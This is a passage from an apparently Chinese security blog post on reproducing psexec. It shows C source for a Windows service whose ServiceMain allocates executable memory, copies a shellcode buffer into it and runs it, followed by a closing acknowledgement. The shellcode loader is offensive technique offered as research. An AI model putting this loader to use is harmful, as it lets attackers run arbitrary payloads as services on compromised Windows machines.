class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-comment">/* Report current status  */</span><br>    <span class="hljs-built_in">SetServiceStatus</span>(hStatus, &amp;ServiceStatus);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">ServiceMain</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv)</span></span><br><span class="hljs-function"></span>&#123;<br>    WCHAR WserviceName[] = <span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;sdd&quot;</span>);<br>    <span class="hljs-keyword">int</span> error;<br>    ServiceStatus.dwServiceType =<br>        SERVICE_WIN32;<br>    ServiceStatus.dwCurrentState =<br>        SERVICE_START_PENDING;<br>    <span class="hljs-comment">/*在本例中只接受系统关机和停止服务两种控制命令*/</span><br>    ServiceStatus.dwControlsAccepted =<br>        SERVICE_ACCEPT_SHUTDOWN |<br>        SERVICE_ACCEPT_STOP;<br>    ServiceStatus.dwWin32ExitCode = <span class="hljs-number">0</span>;<br>    ServiceStatus.dwServiceSpecificExitCode = <span class="hljs-number">0</span>;<br>    ServiceStatus.dwCheckPoint = <span class="hljs-number">0</span>;<br>    ServiceStatus.dwWaitHint = <span class="hljs-number">0</span>;<br>    hStatus = ::<span class="hljs-built_in">RegisterServiceCtrlHandler</span>(<br>        WserviceName,<br>        (LPHANDLER_FUNCTION)CtrlHandler);<br>    <span class="hljs-keyword">if</span> (hStatus == (SERVICE_STATUS_HANDLE)<span class="hljs-number">0</span>)<br>    &#123;<br><br>        <span class="hljs-built_in">WriteToLog</span>(<span class="hljs-string">&quot;RegisterServiceCtrlHandler failed&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-built_in">WriteToLog</span>(<span class="hljs-string">&quot;RegisterServiceCtrlHandler success&quot;</span>);<br>    <span class="hljs-comment">/* Initialize Service   */</span><br>    error = <span class="hljs-built_in">InitService</span>();<br>    <span class="hljs-keyword">if</span> (error)<br>    &#123;<br>        <span class="hljs-comment">/* Initialization failed  */</span><br>        ServiceStatus.dwCurrentState =<br>            SERVICE_STOPPED;<br>        ServiceStatus.dwWin32ExitCode = <span class="hljs-number">-1</span>;<br>        <span class="hljs-built_in">SetServiceStatus</span>(hStatus, &amp;ServiceStatus);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    LPVOID Memory = <span class="hljs-built_in">VirtualAlloc</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);<br>    <span class="hljs-built_in">memcpy</span>(Memory, buf, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(buf));<br>    ((<span class="hljs-built_in"><span class="hljs-keyword">void</span></span>(*)())Memory)();<br><br>    <span class="hljs-comment">/*向SCM 报告运行状态*/</span><br>    ServiceStatus.dwCurrentState =<br>        SERVICE_RUNNING;<br>    <span class="hljs-built_in">SetServiceStatus</span>(hStatus, &amp;ServiceStatus);<br><br>    <span class="hljs-comment">/*do something you want to do in this while loop*/</span><br>    MEMORYSTATUS memstatus;<br>    <span class="hljs-keyword">while</span> (ServiceStatus.dwCurrentState ==<br>        SERVICE_RUNNING)<br>    &#123;<br>        <span class="hljs-keyword">char</span> buffer[<span class="hljs-number">16</span>];<br>        <span class="hljs-built_in">GlobalMemoryStatus</span>(&amp;memstatus);<br>        <span class="hljs-keyword">int</span> availmb = memstatus.dwAvailPhys / <span class="hljs-number">1024</span> / <span class="hljs-number">1024</span>;<br>        <span class="hljs-built_in">sprintf_s</span>(buffer, <span class="hljs-number">100</span>, <span class="hljs-string">&quot;available memory is %dMB&quot;</span>, availmb);<br>        <span class="hljs-keyword">int</span> result = <span class="hljs-built_in">WriteToLog</span>(buffer);<br>        <span class="hljs-keyword">if</span> (result)<br>        &#123;<br>            ServiceStatus.dwCurrentState = SERVICE_STOPPED;<br>            ServiceStatus.dwWin32ExitCode = <span class="hljs-number">-1</span>;<br>            <span class="hljs-built_in">SetServiceStatus</span>(hStatus,<br>                &amp;ServiceStatus);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-built_in">Sleep</span>(SLEEP_TIME);<br>    &#125;<br>    <span class="hljs-built_in">WriteToLog</span>(<span class="hljs-string">&quot;service stopped&quot;</span>);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/psexec/24.png"></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>本次研究psexec到这就基本结束了,我自己是没有能力研究出来的,参考了很多大佬的文章,尤其是倾旋大佬,再次感谢！</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
